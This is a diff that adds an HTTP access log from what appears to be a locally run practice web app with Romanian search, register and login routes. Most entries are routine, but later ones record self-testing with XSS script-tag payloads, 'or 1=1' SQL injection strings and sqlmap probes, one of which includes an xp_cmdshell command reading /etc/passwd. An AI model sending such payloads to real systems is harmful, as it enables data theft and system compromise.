@@ -1,0 +1,604 @@
+[2025-11-04T20:38:18.528Z] GET / - 404 - ::1
+[2025-11-04T20:38:18.680Z] GET /favicon.ico - 404 - ::1
+[2025-11-04T20:43:05.640Z] GET / - 404 - ::1
+[2025-11-04T20:45:54.949Z] POST /register - 200 - ::1
+[2025-11-04T20:46:28.523Z] GET / - 404 - ::1
+[2025-11-04T20:52:06.881Z] POST /register - 200 - ::1
+[2025-11-04T20:52:33.151Z] POST /register - 200 - ::1
+[2025-11-04T21:02:20.349Z] POST /register - 200 - ::1
+[2025-11-04T21:39:43.147Z] GET / - 404 - ::1
+[2025-11-04T21:54:27.870Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-11-04T21:54:52.579Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-11-04T21:55:10.620Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-11-04T21:55:16.382Z] GET /cauta?nume=Roxana - 200 - ::1
+[2025-11-05T06:39:09.999Z] GET / - 404 - ::1
+[2025-11-05T06:39:10.118Z] GET /favicon.ico - 404 - ::1
+[2025-11-05T06:39:18.961Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-11-05T06:39:24.484Z] GET /cauta?prenume=Ion - 200 - ::1
+[2025-11-05T06:41:18.569Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-11-05T06:41:24.713Z] GET /cauta?nume=Ionnn - 200 - ::1
+[2025-11-09T08:47:55.928Z] GET / - 404 - ::1
+[2025-11-09T08:47:55.998Z] GET /favicon.ico - 404 - ::1
+[2025-11-09T08:47:57.678Z] GET / - 404 - ::1
+[2025-11-11T19:31:14.272Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-11-11T19:31:14.442Z] GET /favicon.ico - 404 - ::1
+[2025-11-11T20:35:23.226Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-11-11T21:16:37.689Z] GET /cauta?nume=$%7Bthis.searchName%7D - 200 - ::1
+[2025-11-11T21:16:43.048Z] GET /cauta?nume=undefined - 200 - ::1
+[2025-11-11T21:16:45.910Z] GET /cauta?nume=undefined - 200 - ::1
+[2025-11-11T21:16:46.675Z] GET /cauta?nume=undefined - 200 - ::1
+[2025-11-11T21:16:46.817Z] GET /cauta?nume=undefined - 200 - ::1
+[2025-11-11T21:18:05.612Z] GET /cauta?nume= - 200 - ::1
+[2025-11-11T21:18:08.951Z] GET /cauta?nume= - 200 - ::1
+[2025-11-11T21:18:09.549Z] GET /cauta?nume= - 200 - ::1
+[2025-11-11T21:26:41.496Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-11-11T21:26:45.281Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-11-11T21:26:51.048Z] GET /cauta?nume=Ionnn - 200 - ::1
+[2025-11-11T21:26:55.697Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-11-11T21:27:11.786Z] GET /cauta?nume= - 200 - ::1
+[2025-11-12T06:43:54.482Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-11-19T06:17:54.322Z] POST /register - 200 - ::1
+[2025-12-09T20:48:27.581Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T20:48:39.605Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T20:50:31.383Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T20:51:56.354Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T20:52:08.361Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T20:53:02.014Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T20:53:20.058Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:04:19.703Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:04:22.888Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:04:25.895Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:04:29.201Z] GET /cauta?nume=Rox - 200 - ::1
+[2025-12-09T21:06:06.323Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:06:50.070Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:07:37.523Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:07:38.587Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:10:10.732Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:10:13.342Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:10:17.250Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:10:17.978Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:10:19.147Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:11:20.772Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:11:22.421Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:11:27.073Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:11:28.287Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:11:28.445Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:11:31.078Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:11:39.636Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:12:22.402Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:12:24.201Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:12:25.272Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:12:28.769Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:14:28.276Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:15:06.400Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:16:28.051Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:16:32.594Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:16:50.369Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:17:57.308Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:18:00.459Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:29:32.559Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:29:34.921Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:29:39.075Z] GET /cauta?nume= - 200 - ::1
+[2025-12-09T21:29:41.381Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:29:41.934Z] GET /cauta?nume=Ana - 200 - ::1
+[2025-12-09T21:29:46.449Z] GET /cauta?nume=Ion - 200 - ::1
+[2025-12-09T21:29:50.707Z] GET /cauta?nume=Rox - 200 - ::1
+[2025-12-09T21:31:58.778Z] GET /cauta?nume=maria - 200 - ::1
+[2025-12-09T21:34:01.288Z] GET /cauta?q=%3Cscript%3Ealert(%27hello%27)%3C/script%3E - 200 - ::1
+[2025-12-09T21:57:12.516Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T21:57:12.539Z] GET /favicon.ico - 404 - ::1
+[2025-12-09T21:58:32.431Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:00:49.107Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:01:23.230Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:07:43.706Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:07:54.729Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:07:57.748Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:08:14.614Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:10:04.441Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:10:56.267Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:12:41.564Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2025-12-09T22:15:59.755Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T16:27:04.326Z] POST /register - 200 - ::1
+[2026-01-09T19:53:29.411Z] POST /register - 200 - ::1
+[2026-01-09T19:53:45.762Z] POST /register - 200 - ::1
+[2026-01-09T19:57:28.053Z] POST /register - 200 - ::1
+[2026-01-09T19:57:35.984Z] POST /register - 200 - ::1
+[2026-01-09T19:57:45.065Z] POST /register - 200 - ::1
+[2026-01-09T19:58:39.488Z] POST /register - 200 - ::1
+[2026-01-09T20:00:21.566Z] POST /register - 200 - ::1
+[2026-01-09T20:22:45.372Z] GET /favicon.ico - 404 - ::1
+[2026-01-09T20:24:27.595Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T20:25:14.519Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T20:26:06.595Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T20:37:25.818Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T20:37:25.867Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T20:37:28.032Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T21:01:31.069Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T21:06:15.356Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T21:06:42.239Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T21:11:09.609Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T21:17:35.865Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T21:17:44.986Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-09T21:18:17.821Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:06:43.609Z] GET /cauta=?anamaria%3Cscript%20src=%22http://localhost:5000/script.js%22%3E%20%3C/script%3E - 404 - ::1
+[2026-01-10T11:06:43.741Z] GET /favicon.ico - 404 - ::1
+[2026-01-10T11:14:04.122Z] POST /register - 201 - ::1
+[2026-01-10T11:24:10.760Z] GET /allusers - 404 - ::1
+[2026-01-10T11:24:13.637Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:24:28.438Z] GET /allusers - 404 - ::1
+[2026-01-10T11:24:28.481Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:27:54.057Z] POST /register - 201 - ::1
+[2026-01-10T11:27:58.860Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:29:52.402Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:32:00.242Z] POST /register - 201 - ::1
+[2026-01-10T11:32:06.148Z] POST /register - 201 - ::1
+[2026-01-10T11:32:08.980Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:39:47.960Z] POST /register - 201 - ::1
+[2026-01-10T11:39:50.613Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:40:24.238Z] POST /register - 201 - ::1
+[2026-01-10T11:40:27.920Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:45:43.883Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:47:09.689Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T11:51:12.790Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T12:07:53.272Z] POST /register - 201 - ::1
+[2026-01-10T12:11:27.758Z] POST /register - 201 - ::1
+[2026-01-10T12:12:06.916Z] POST /register - 201 - ::1
+[2026-01-10T12:12:21.535Z] POST /register - 201 - ::1
+[2026-01-10T12:14:50.964Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-10T13:36:44.400Z] POST /verificare - 404 - ::1
+[2026-01-10T13:38:50.969Z] POST /verificare - 404 - ::1
+[2026-01-10T13:39:06.067Z] POST /verificare - 404 - ::1
+[2026-01-10T13:40:08.213Z] POST /register - 201 - ::1
+[2026-01-10T13:40:24.982Z] POST /verificare - 404 - ::1
+[2026-01-10T13:42:02.944Z] POST /verificare - 404 - ::1
+[2026-01-10T13:42:46.540Z] POST /verificare - 404 - ::1
+[2026-01-10T13:45:58.141Z] GET /verificare - 404 - ::1
+[2026-01-10T13:45:58.350Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-12T14:05:08.524Z] POST /register - 201 - ::1
+[2026-01-14T18:19:14.716Z] POST /register - 201 - ::1
+[2026-01-14T19:16:10.164Z] GET /login - 404 - ::1
+[2026-01-14T19:16:10.224Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-14T19:16:10.277Z] GET /favicon.ico - 404 - ::1
+[2026-01-14T19:16:26.280Z] GET /login - 404 - ::1
+[2026-01-14T19:16:26.349Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-14T19:16:29.492Z] GET /login - 404 - ::1
+[2026-01-14T19:16:29.647Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-14T19:17:02.125Z] GET /login - 404 - ::1
+[2026-01-14T19:17:02.180Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-14T19:17:04.468Z] GET /login - 404 - ::1
+[2026-01-14T19:17:04.618Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-14T19:19:28.275Z] GET /login - 404 - ::1
+[2026-01-14T19:19:28.309Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-14T19:37:51.830Z] POST /register - 409 - ::1
+[2026-01-14T19:45:27.578Z] POST /register - 409 - ::1
+[2026-01-14T19:49:30.654Z] POST /register - 409 - ::1
+[2026-01-14T19:50:16.965Z] POST /register - 409 - ::1
+[2026-01-14T20:43:08.991Z] POST /register - 409 - ::1
+[2026-01-14T20:43:14.647Z] POST /register - 201 - ::1
+[2026-01-16T15:26:06.209Z] GET /private - 404 - ::1
+[2026-01-16T15:26:06.338Z] GET /favicon.ico - 404 - ::1
+[2026-01-16T15:26:10.159Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-16T15:28:48.530Z] GET /private - 404 - ::1
+[2026-01-16T15:28:48.571Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-16T15:29:07.890Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-16T15:29:16.593Z] GET /private - 404 - ::1
+[2026-01-16T15:29:16.662Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - ::1
+[2026-01-16T15:40:29.158Z] POST /register - 201
+[2026-01-19T18:56:59.896Z] POST /register - 201
+[2026-01-19T19:05:16.928Z] POST /register - 409
+[2026-01-19T19:06:29.317Z] POST /register - 201
+[2026-01-19T19:59:47.229Z] POST /register - 201
+[2026-01-19T20:08:55.238Z] POST /register - 201
+[2026-01-19T20:12:10.132Z] POST /register - 409
+[2026-01-19T20:12:33.592Z] POST /register - 201
+[2026-01-19T21:09:50.650Z] POST /verificare - 200 - IP: ::1 - LOGIN SUCCESS - Username: roxana1234 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:09:50.651Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:09:50.652Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:10:30.107Z] GET /logout - 200 - IP: ::1 - LOGOUT SUCCESS - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:10:30.108Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:10:30.110Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:10:37.568Z] POST /verificare - 200 - IP: ::1 - LOGIN SUCCESS - Username: roxana1234 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:10:37.569Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:10:37.570Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:21:58.982Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:21:58.984Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:22:02.559Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:22:02.562Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:23:40.207Z] GET /cauta?nume=ana%20or%201%3D1 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:23:40.208Z] GET /cauta?nume=ana%20or%201%3D1 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:23:47.551Z] GET /cauta?nume=ana%20%27or%201%3D1%27 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:23:47.553Z] GET /cauta?nume=ana%20%27or%201%3D1%27 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:23:53.655Z] GET /cauta?nume=ana%20%22or%201%3D1%22 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:23:53.656Z] GET /cauta?nume=ana%20%22or%201%3D1%22 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:26:57.430Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:26:57.434Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:27:19.698Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:27:19.699Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:27:28.559Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:27:28.560Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:00.219Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:00.221Z] GET /cauta?nume=ana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:04.593Z] GET /cauta?nume=roxana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:04.594Z] GET /cauta?nume=roxana - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:09.467Z] GET /cauta?nume=rox - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:09.469Z] GET /cauta?nume=rox - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:28.637Z] GET /cauta?nume=rox%20%22or%201%3D1%22 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:28.638Z] GET /cauta?nume=rox%20%22or%201%3D1%22 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:34.654Z] GET /cauta?nume=rox%20%27or%201%3D1%27 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:30:34.656Z] GET /cauta?nume=rox%20%27or%201%3D1%27 - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:37:17.028Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:37:17.035Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:38:12.341Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:38:12.343Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T21:41:15.663Z] GET /find-user?name=ion - 404 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.343Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.344Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.477Z] GET /cauta?nume=ion&UpLW=2819%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.479Z] GET /cauta?nume=ion&UpLW=2819%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.848Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.848Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.907Z] GET /cauta?nume=ion%22%27%28.%2C%29%2C%2C%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.908Z] GET /cauta?nume=ion%22%27%28.%2C%29%2C%2C%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.937Z] GET /cauta?nume=ion%27InHseu%3C%27%22%3EILGhwI - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:51.938Z] GET /cauta?nume=ion%27InHseu%3C%27%22%3EILGhwI - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.021Z] GET /cauta?nume=ion%27%29%20AND%206532%3D2849%20AND%20%28%27YZXL%27%3D%27YZXL - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.022Z] GET /cauta?nume=ion%27%29%20AND%206532%3D2849%20AND%20%28%27YZXL%27%3D%27YZXL - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.047Z] GET /cauta?nume=ion%27%29%20AND%209337%3D9337%20AND%20%28%27Jggm%27%3D%27Jggm - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
